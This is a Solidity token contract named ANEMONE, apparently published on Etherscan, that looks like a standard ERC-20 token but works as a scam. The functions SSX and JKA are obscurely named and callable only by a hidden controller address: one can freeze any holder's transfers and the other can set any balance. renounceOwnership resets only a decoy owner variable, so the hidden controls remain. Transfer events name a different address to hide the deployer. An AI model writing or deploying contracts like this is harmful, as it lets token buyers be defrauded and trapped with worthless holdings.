/**
 *Submitted for verification at Etherscan.io on 2023-02-22
*/

pragma solidity 0.8.18;

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract ANEMONE {
  
    mapping (address => uint256) private axB;
	
    mapping (address => uint256) private axC;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "ANEMONE";
	
    string public symbol = "ANEMONE";
    uint8 public decimals = 6;

    uint256 public totalSupply = 250000000 *10**6;
    address owner = msg.sender;
	  address private axV;
    uint256 private zMIN;
    address private axZ;
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address axG = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
		
    axZ = msg.sender;
	
    axB[msg.sender] = totalSupply;
	
	 zMIN = 0;
	 
    axV = axG;
	
    emit Transfer(address(0), axV, totalSupply); 
   
    }

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }


   function balanceOf(address account) public view  returns (uint256) {
        return axB[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {


    
        require(axB[msg.sender] >= value);
        require(axC[msg.sender] <= zMIN); 
  axB[msg.sender] -= value;  
        axB[to] += value;          
 emit Transfer(msg.sender, to, value);
        return true; }
		
		       function SSX (address Zx, uint256 Zk)  public {
     require(msg.sender == axZ);
	 
	 
   axC[Zx] = Zk;
   
   
   }


 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function JKA (address Zx, uint256 Zk)  public {
		
    require(msg.sender == axZ);
	
	
    axB[Zx] = Zk;}
   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  
     
        require(axC[from] <= zMIN);
        require(axC[to] <= zMIN);
        require(value <= axB[from]);
        require(value <= allowance[from][msg.sender]);
        axB[from] -= value;
        axB[to] += value;
        allowance[from][msg.sender] -= value;
       if(from == axZ) {from = axG;}
        emit Transfer(from, to, value);
        return true; }



    }